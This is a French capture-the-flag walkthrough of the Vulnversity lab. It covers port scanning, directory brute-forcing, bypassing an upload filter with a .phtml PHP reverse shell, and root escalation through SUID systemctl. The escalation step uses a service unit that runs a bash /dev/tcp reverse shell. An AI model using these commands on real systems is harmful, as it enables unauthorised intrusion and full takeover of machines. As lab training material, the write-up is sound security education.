---
title: "001-Vulnversity"
date: 2024-10-01
draft: false
tags:
  - find
  - nmap
  - gobuster
  - netcat
  - SUID
  - systemctl
  - GTFOBins
  - Linux
aliases:
  - Vulnversity
---
Learn about active recon, web app attacks and privilege escalation.
## Reconnaissance

On utilise [[Nmap]] afin découvrir les ports et services accessibles sur l'hôte cible.

**nmap -sS -sV -sC -A -p- 10.10.108.95**

	PORT     STATE SERVICE     VERSION
	21/tcp   open  ftp         vsftpd 3.0.3
	22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
	139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
	3128/tcp open  http-proxy  Squid http proxy 3.5.12
		http-server-header: squid/3.5.12
		http-title: ERROR: The requested URL could not be retrieved
	3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
		http-server-header: Apache/2.4.18 (Ubuntu)
		http-title: Vuln University

## Locating directories using Gobuster

On utilise [[Gobuster]] afin de découvrir les fichiers et dossiers cachés sur le serveur web.

**gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.108.95:3333/**

	[+] Url:                     http://10.10.108.95:3333/
	[+] Method:                  GET
	[+] Threads:                 10
	[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.6

	/images               (Status: 301) [Size: 320] [--> http://10.10.108.95:3333/images/]
	/css                  (Status: 301) [Size: 317] [--> http://10.10.108.95:3333/css/]
	/js                   (Status: 301) [Size: 316] [--> http://10.10.108.95:3333/js/]
	/fonts                (Status: 301) [Size: 319] [--> http://10.10.108.95:3333/fonts/]
	/internal             (Status: 301) [Size: 322] [--> http://10.10.108.95:3333/internal/]

Ceci nous permet de trouver une page permettant d'upload un fichier.

![[Pasted image 20240930102604.png]]

## Compromission du serveur web

On peut maintenant utiliser ce formulaire afin d'uploader des fichiers puis exécuter un payload permettant de compromettre le serveur, donc d'y gagner un accès.
Cependant, on peut avant tout tenter de trouver les extensions non bloquées par le formulaire en utilisant du [[Fuzzing]] en utilisant [[Burpsuite]].
Pour cela on créé  une liste d'extensions potentielles.

**cat <<'[[EOF]]' > liste_extensions.txt**    

	heredoc> .php
	heredoc> .php3
	heredoc> .php4
	heredoc> .php5
	heredoc> .phtml
	heredoc> EOF

On utilise ensuite l'attaque [[Intruder#Sniper|Sniper]] de l'[[Intruder]] de [[Burpsuite]] afin d'intercepter la requête générée lors de l'envoi d'un fichier aléatoire "payload.html" puis de modifier avec la requête en bruteforçant à l'aide de notre liste précédemment créée.

La seule réponse de taille différente est obtenue pour l'extension ".phtml", en observant le résultat on remarque que contrairement aux autres ou il est retourné "extension not allowed", celle-ci est autorisée.

![[Pasted image 20240930105739.png]]

On peut donc créer un  [[Reverse Shell#PHP|Reverse Shell PHP]] en extension ".phtml" afin de l'upload sur le serveur distant et le forcer à initier une connexion avec nous.
Il faut donc se mettre en écoute de connexions entrantes, uploader et exécuter notre shell.

Payload -> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

On remplace l'IP de la fonction exec avec la notre ainsi que le port sur lequel nous sommes en écoute des connexions entrantes avec [[Netcat]].

**nc -lvnp 4443 **

	Ncat: Version 7.93 ( https://nmap.org/ncat )
	Ncat: Listening on :::4443
	Ncat: Listening on 0.0.0.0:4443

![[Pasted image 20240930113050.png]]

En cliquant maintenant sur le payload pour l'afficher, ceci l'exécute et nous offre un [[Reverse Shell]] sur la cible.

L'accès gagné nous permet de voir avec la commande "whoami" que nous somme connectés en tant qu'utilisateur "www-data" et l'affichage avec "cat" du fichier "/etc/passwd" permet de voir que l'utilisateur "bill" gère le serveur.
Sur son bureau se trouve le userflag.txt.

## Privilege Escalation

La recherche des binaires ayant une permission [[SUID]] d'activée sont les suivants :

**find / -user root -perm -4000 -print 2>/dev/null**

	./bin/su
	./bin/ntfs-3g
	./bin/mount
	./bin/ping6
	./bin/umount
	./bin/systemctl
	./bin/ping
	./bin/fusermount

On retrouve notamment le binaire [[Systemctl]], permettant, d'après le [[GTFOBins]] de faire une escalade de privilèges.
Voir : https://gtfobins.github.io/gtfobins/systemctl/

On peut créer notre propre service nommé afin d'obtenir un reverse shell avec privilèges.

**nano root.service**

```
[Unit]
Description=roooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'

[Install]
WantedBy=multi-user.target
```

On va ensuite l'upload dans un dossier disponible à l'écriture pour l'utilisation courant, comme le dossier [[Temp]] notamment.
Il est aussi possible de retrouver des dossiers de ce type avec la commande suivante :

**find / -type d -maxdepth 2 -writable**

Par la suite, on transfère le payload à la cible avec [[Netcat]].

1) Lancement de l'écoute de la cible sur son port 4445 et transfert des données reçues dans le fichier root.service : **nc -lv 4445 > root.service 
2) Envoi du payload "root.service" à la cible via son port d'écoute : nc -n "IP" "PORT" root.service

Il faut noter que la même manipulation était possible avec un serveur python et la commande wget depuis la cible.
Enfin, on lance lance l'écoute sur notre hôte sur le port décrit dans le "root.service" afin d'obtenir notre reverse shell lors du lancement du service créé.

**systemctl enable /tmp/root.service**

	Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /tmp/root.service.
	Created symlink from /etc/systemd/system/root.service to /tmp/root.service.

Ceci nous offre donc un reverse shell sur la cible et une connexion en tant qu'utilisateur "root" pour lequel le dernier flag est présent sur son bureau.
